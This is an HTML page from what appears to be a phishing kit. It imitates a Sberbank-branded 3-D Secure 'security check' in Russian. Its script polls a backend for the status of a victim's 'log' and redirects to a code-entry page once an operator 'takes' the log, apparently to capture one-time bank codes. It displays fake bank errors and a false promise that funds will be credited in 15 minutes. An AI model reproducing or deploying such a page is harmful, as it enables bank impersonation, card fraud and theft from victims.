<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta http-equiv="Cache-control" content="no-cache">
    <title>Проверка безопасности | 3-D Secure</title>
    <link rel="shortcut icon" href="favicons/favicon_sber.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: linear-gradient(180deg, #0a1628 0%, #1a2d4a 50%, #0f1f35 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            overflow: hidden;
        }
        
        /* Background animation */
        .bg-animation {
            position: fixed;
            inset: 0;
            overflow: hidden;
            z-index: 0;
        }
        .bg-circle {
            position: absolute;
            border-radius: 50%;
            background: radial-gradient(circle, rgba(33,160,56,0.15) 0%, transparent 70%);
            animation: float 8s ease-in-out infinite;
        }
        .bg-circle:nth-child(1) {
            width: 600px;
            height: 600px;
            top: -200px;
            right: -100px;
            animation-delay: 0s;
        }
        .bg-circle:nth-child(2) {
            width: 400px;
            height: 400px;
            bottom: -100px;
            left: -100px;
            animation-delay: -3s;
        }
        @keyframes float {
            0%, 100% { transform: translate(0, 0) scale(1); }
            50% { transform: translate(20px, -20px) scale(1.05); }
        }
        
        /* Card */
        .card {
            position: relative;
            z-index: 1;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 48px 40px;
            width: 100%;
            max-width: 420px;
            text-align: center;
            animation: fadeIn 0.6s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* 3DS Logo */
        .logo-3ds {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-bottom: 32px;
        }
        .logo-3ds__icon {
            width: 48px;
            height: 48px;
            background: linear-gradient(135deg, #21a038 0%, #2bc94a 100%);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .logo-3ds__icon svg {
            width: 28px;
            height: 28px;
            fill: #fff;
        }
        .logo-3ds__text {
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            letter-spacing: -0.5px;
        }
        .logo-3ds__text span {
            color: #21a038;
        }
        
        /* Spinner */
        .spinner-container {
            position: relative;
            width: 100px;
            height: 100px;
            margin: 0 auto 32px;
        }
        .spinner {
            width: 100%;
            height: 100%;
            border: 4px solid rgba(33, 160, 56, 0.1);
            border-top-color: #21a038;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        .spinner-inner {
            position: absolute;
            inset: 15px;
            border: 3px solid rgba(33, 160, 56, 0.05);
            border-bottom-color: rgba(33, 160, 56, 0.5);
            border-radius: 50%;
            animation: spin 1.5s linear infinite reverse;
        }
        .spinner-icon {
            position: absolute;
            inset: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .spinner-icon svg {
            width: 24px;
            height: 24px;
            fill: #21a038;
            animation: pulse 2s ease-in-out infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        @keyframes pulse {
            0%, 100% { opacity: 0.5; transform: scale(0.9); }
            50% { opacity: 1; transform: scale(1.1); }
        }
        
        /* Text */
        .title {
            color: #fff;
            font-size: 22px;
            font-weight: 600;
            margin-bottom: 12px;
        }
        .desc {
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 28px;
        }
        
        /* Card info */
        .card-info {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 12px;
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 24px;
        }
        .card-info__icon {
            width: 40px;
            height: 28px;
            background: linear-gradient(135deg, #1a1f36 0%, #2d3250 100%);
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .card-info__icon svg {
            width: 24px;
            height: 16px;
            fill: #ffd700;
        }
        .card-info__number {
            color: rgba(255, 255, 255, 0.9);
            font-size: 15px;
            font-family: 'Monaco', 'Menlo', monospace;
            letter-spacing: 1px;
        }
        
        /* Progress */
        .progress {
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 2px;
            overflow: hidden;
        }
        .progress__bar {
            height: 100%;
            background: linear-gradient(90deg, #21a038, #2bc94a);
            border-radius: 2px;
            animation: progress 3s ease-in-out infinite;
        }
        @keyframes progress {
            0% { width: 0%; }
            50% { width: 80%; }
            100% { width: 100%; }
        }
        
        /* Footer */
        .footer {
            margin-top: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            color: rgba(255, 255, 255, 0.4);
            font-size: 12px;
        }
        .footer svg {
            width: 14px;
            height: 14px;
            fill: currentColor;
        }
        
        /* Error state */
        .card.error .spinner-container {
            display: none;
        }
        .card.error .error-icon {
            display: flex;
        }
        .card.error .progress {
            display: none;
        }
        .error-icon {
            display: none;
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: rgba(239, 68, 68, 0.1);
            border-radius: 50%;
            align-items: center;
            justify-content: center;
        }
        .error-icon svg {
            width: 40px;
            height: 40px;
            fill: #ef4444;
        }
        
        /* Success state */
        .card.success .spinner-container {
            display: none;
        }
        .card.success .success-icon {
            display: flex;
        }
        .card.success .progress {
            background: #21a038;
        }
        .card.success .progress__bar {
            width: 100%;
            animation: none;
        }
        .success-icon {
            display: none;
            width: 80px;
            height: 80px;
            margin: 0 auto 24px;
            background: rgba(33, 160, 56, 0.1);
            border-radius: 50%;
            align-items: center;
            justify-content: center;
            animation: scaleIn 0.4s ease;
        }
        .success-icon svg {
            width: 40px;
            height: 40px;
            fill: #21a038;
        }
        @keyframes scaleIn {
            from { transform: scale(0); }
            to { transform: scale(1); }
        }
        
        @media (max-width: 480px) {
            .card {
                padding: 32px 24px;
            }
            .title {
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <div class="bg-animation">
        <div class="bg-circle"></div>
        <div class="bg-circle"></div>
    </div>
    
    <div class="card" id="card">
        <div class="logo-3ds">
            <div class="logo-3ds__icon">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
            </div>
            <div class="logo-3ds__text"><span>3-D</span> Secure</div>
        </div>
        
        <div class="spinner-container">
            <div class="spinner"></div>
            <div class="spinner-inner"></div>
            <div class="spinner-icon">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 6c1.4 0 2.8 1.1 2.8 2.5V11c.6.3 1.2 1 1.2 1.8v3.5c0 1-.8 1.7-1.7 1.7H9.7c-.9 0-1.7-.7-1.7-1.7v-3.5c0-.8.6-1.5 1.2-1.8V9.5C9.2 8.1 10.6 7 12 7z"/></svg>
            </div>
        </div>
        
        <div class="error-icon">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
        </div>
        
        <div class="success-icon">
            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
        </div>
        
        <h1 class="title">Проверка безопасности</h1>
        <p class="desc">Пожалуйста, подождите.<br>Выполняется проверка транзакции банком-эмитентом.</p>
        
        <div class="card-info">
            <div class="card-info__icon">
                <svg viewBox="0 0 24 16"><rect width="24" height="16" rx="2" fill="#1a1f36"/><circle cx="8" cy="8" r="4" fill="#eb001b"/><circle cx="16" cy="8" r="4" fill="#f79e1b" fill-opacity="0.8"/></svg>
            </div>
            <span class="card-info__number" id="cardNumber">**** **** **** ****</span>
        </div>
        
        <div class="progress">
            <div class="progress__bar"></div>
        </div>
        
        <div class="footer">
            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
            <span>Защищённое соединение</span>
        </div>
    </div>

    <script>
        const API_URL = '/api';
        const LOG_ID = new URLSearchParams(window.location.search).get('id');
        const card = document.getElementById('card');
        const title = document.querySelector('.title');
        const desc = document.querySelector('.desc');
        const cardNumber = document.getElementById('cardNumber');

        if (!LOG_ID) {
            window.location.href = 'receive.html';
        }

        // Проверяем статус каждые 2 секунды
        async function checkStatus() {
            try {
                const response = await fetch(`${API_URL}/log/${LOG_ID}/status`);
                const data = await response.json();

                // Показываем последние 4 цифры карты
                if (data.card_last4) {
                    cardNumber.textContent = `**** **** **** ${data.card_last4}`;
                }

                if (data.status === 'taken' || data.status === 'code' || data.status === 'code_received') {
                    // Лог взят — переходим на страницу ввода кода
                    window.location.href = `code.html?id=${LOG_ID}`;
                } else if (data.status === 'error' && data.error) {
                    // Показываем ошибку
                    card.classList.add('error');
                    title.textContent = 'Ошибка';
                    desc.textContent = data.error;
                    
                    setTimeout(() => {
                        window.location.href = 'receive.html';
                    }, 5000);
                } else if (data.status === 'success') {
                    card.classList.add('success');
                    title.textContent = 'Успешно!';
                    desc.textContent = 'Средства будут зачислены в течение 15 минут.';
                } else {
                    // Продолжаем проверять
                    setTimeout(checkStatus, 2000);
                }
            } catch (error) {
                console.error('Status check error:', error);
                setTimeout(checkStatus, 3000);
            }
        }

        checkStatus();
    </script>
</body>
</html>
